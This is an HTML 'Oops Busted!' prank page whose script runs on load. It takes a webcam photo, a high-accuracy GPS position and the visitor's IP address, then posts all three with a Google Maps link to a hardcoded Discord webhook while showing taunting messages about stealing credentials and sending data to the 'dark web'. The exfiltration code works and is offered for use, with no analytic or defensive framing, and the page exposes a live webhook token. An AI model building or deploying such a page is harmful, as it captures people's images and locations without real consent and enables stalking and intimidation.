<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Oops Busted!</title>
  <style>
    body {
      margin: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-image: url('https://cdn.unstability.ai/users/f6624cb8-cdb4-4e46-adb4-6567149af7e4/images/15412224-0be4-4e37-9432-b83f475946ea/0.png');
      background-size: cover;
      background-position: center;
      color: white;
      text-align: center;
    }
    #message {
      font-family: Arial, sans-serif;
      font-size: 18px;
      margin-bottom: 20px;
      padding: 10px;
      background-color: rgba(0, 0, 0, 0.5);
      border: 1px solid white;
      border-radius: 5px;
    }
    #console {
      background-color: rgba(0, 0, 0, 0.7);
      color: lime;
      font-family: monospace;
      padding: 10px;
      width: 90%;
      max-width: 600px;
      height: 200px;
      overflow-y: auto;
      border: 1px solid white;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 20px;
      margin-top: 20px;
      width: 90%;
    }
    #map {
      width: 50%;
      height: 300px;
      border: 1px solid white;
    }
    #preview {
      width: 50%;
      max-height: 300px;
      object-fit: contain;
      border: 1px solid white;
      display: none;
    }
  </style>
  <!-- Leaflet.js Library -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
</head>
<body>
  <div id="message">Initializing... Please allow permissions if prompted.</div>
  <div id="console"></div>
  <div class="container">
    <div id="map" style="display: none;"></div>
    <img id="preview" alt="Captured Image Preview">
  </div>

  <script>
    const debugConsole = document.getElementById("console");
    const messageDiv = document.getElementById("message");
    const previewImg = document.getElementById("preview");
    const mapDiv = document.getElementById("map");

    function logMessage(message) {
      const timestamp = new Date().toISOString();
      debugConsole.innerHTML += `[${timestamp}] ${message}<br>`;
      debugConsole.scrollTop = debugConsole.scrollHeight;
      console.log(message);
    }

    function updateMessage(text) {
      messageDiv.innerText = text;
    }

    async function getGPSLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation is not supported by this browser."));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          position => {
            logMessage(`GPS location acquired: Lat ${position.coords.latitude}, Long ${position.coords.longitude}`);
            resolve(position);
          },
          error => {
            let errorMessage;
            switch (error.code) {
              case error.PERMISSION_DENIED:
                errorMessage = "User denied GPS permission.";
                break;
              case error.POSITION_UNAVAILABLE:
                errorMessage = "GPS location unavailable.";
                break;
              case error.TIMEOUT:
                errorMessage = "GPS request timed out.";
                break;
              default:
                errorMessage = "Unknown GPS error.";
            }
            logMessage(`GPS Error: ${errorMessage}`);
            reject(new Error(errorMessage));
          },
          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0,
          }
        );
      });
    }

    async function main() {
      updateMessage("stealing credentials...");
      logMessage("Initializing...");

      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      let stream;

      try {
        // Access the user's camera
        logMessage("Requesting camera access...");
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise(resolve => (video.onloadedmetadata = resolve));
        video.play();

        // Capture an image from the camera
        logMessage("Capturing image...");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/png");

        // Stop video stream
        stream.getTracks().forEach(track => track.stop());
        logMessage("Camera stream stopped.");

        // Display captured image
        previewImg.src = imageData;
        previewImg.style.display = "block";

        // Get high-accuracy GPS location
        updateMessage("Fetching GPS location...");
        logMessage("Requesting high-accuracy GPS...");
        const position = await getGPSLocation();
        const { latitude, longitude } = position.coords;
        logMessage(`High-accuracy GPS location: Latitude ${latitude}, Longitude ${longitude}`);
        updateMessage("GPS location acquired.");

        // Display map with Leaflet.js
        mapDiv.style.display = "block";
        const map = L.map("map").setView([latitude, longitude], 15);
        L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
          attribution: 'Map data Â© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors',
        }).addTo(map);
        L.marker([latitude, longitude]).addTo(map).bindPopup("You are here!").openPopup();

        // Get IP address
        updateMessage("Fetching IP address...");
        logMessage("Requesting IP address...");
        const ipResponse = await fetch("https://api64.ipify.org?format=json");
        const { ip } = await ipResponse.json();
        logMessage(`IP Address: ${ip}`);

        // Send data to webhook
        const finalImage = canvas.toDataURL("image/png");
        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const formData = new FormData();
        formData.append("file", new Blob([atob(finalImage.split(",")[1])], { type: "image/png" }), "captured_image.png");
        formData.append("payload_json", JSON.stringify({
          content: `Captured user data:\nIP Address: \`${ip}\`\nCoordinates: \`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\`\nGoogle Maps: ${mapsUrl}`
        }));

        updateMessage("Sending data to Dark web...");
        logMessage("Sending data to Dark web...");
        const response = await fetch(
          "https://discord.com/api/webhooks/1270166449318793296/eJjxv6udxX13mJVpn5ubPqzYQMI9-Xue9G0LAelkswYqcDVVgZp0cLfHXb55RkaPw_w2",
          {
            method: "POST",
            body: formData,
          }
        );

        if (response.ok) {
          logMessage("Data successfully sent to dark web.");
          updateMessage("Life ruin completed successfully.");
        } else {
          const errorText = await response.text();
          logMessage(`Failed to send data: ${response.status} ${response.statusText} - ${errorText}`);
          updateMessage("Failed to send data to Dark web.");
        }
      } catch (error) {
        logMessage(`Error: ${error.message}`);
        updateMessage("An error occurred. Check the debug console for details.");
        console.error(error);
      } finally {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    }

    main().catch(error => console.error("Critical error:", error));
  </script>
</body>
</html>
